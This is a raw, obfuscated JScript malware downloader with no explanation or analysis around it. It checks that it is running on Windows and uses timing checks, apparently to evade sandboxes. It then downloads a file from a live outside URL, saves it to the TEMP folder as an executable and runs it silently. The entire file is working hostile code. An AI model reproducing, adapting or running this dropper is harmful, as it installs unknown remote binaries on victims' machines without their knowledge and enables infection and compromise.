var _H = false;
var _CG = "CreateObject";
var _D0 = function _X() {return WScript[_CG]("WScript"+".Shell");}(), _CQ = 11;
var _X0 = "MSXML2.XMLHTTP";
var _U = 2123213;
var _QX = 0;
function _SK(_OQ){_D0["Run"](_OQ, _QX, _QX);};
function _JX(){return _X0 + "";};
function _UE(_H0, _OI){_QX = _QX * 1; return _H0 - _OI;};
function _RH(){return _CG;};
/*@cc_on
  @if (@_win32 || @_win64)
    _H = true;
  @end
@*/
if (_H)
{
var _M0 = "";
function _BG(){return 22;};
var _IJ = 0; var _XJ = 0;
function _F()
{
var _KA = new this["Date"]();
var _F0 = _KA["getUTCMilliseconds"]();
WScript["Sleep"](_BG());
var _KA = new this["Date"]();
var _G0 = _KA["getUTCMilliseconds"]();
WScript["Sleep"](_BG());
var _KA = new this["Date"]();
var _S = _KA["getUTCMilliseconds"]();
var _IJ = "_VE";
_IJ = _UE(_G0, _F0);
var _XJ = "_XY";
_XJ = _UE(_S, _G0);
_M0 = "open";
return _UE(_IJ, _XJ);
}
var _X1 = false;
var _OO = false;
for (var _G = _QX; _G < _BG() * 1; _G++){if (_F() != _QX){
_X1 = true; 
_XJ = "31" + 11 * _IJ + _XJ; 
_OO = true; 
break;
}}
function _LO() {return ((_X1 == true) && (_X1 == _OO)) ? 1 : _QX;};
if (_X1 && _LO() && _OO){
function _P() {return _D0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "NE06CC5eBnE.ex" + "e";};
 _R = _JX();
 _FD = WScript[_CG](_R);
 var _FN = 1;
 while (_FN){
try {
	if (_FN == 1)
	{
		_FD[_M0]("GET", "http://linkownia.itcom.pl/s9aps", false);
		_FD["send"]();
		_JQ = "Sleep";
	}
	WScript[_JQ](_BG() + 120); 
	if (_FD["readystate"] < 2 * 2) continue;
	_FN = _QX;
	function _M(_L) {var _KD = (1, 2, 3, 4, 5, _L); return _KD;};
	_F1 = WScript[_RH()]("ADODB.Stream");
	_R = _F1;
	_R[_M0]();
	_R["type"] = _M(1);
	_R["write"](_FD["ResponseBody"]);
	_F1["position"] = _M(_QX);
	_R["Save" + "ToFile"](_P(), 2);
	_F1["cl"+"ose"]();
	_D = _P();
	_SK(_D);
} catch(_M1){};
}
}
}

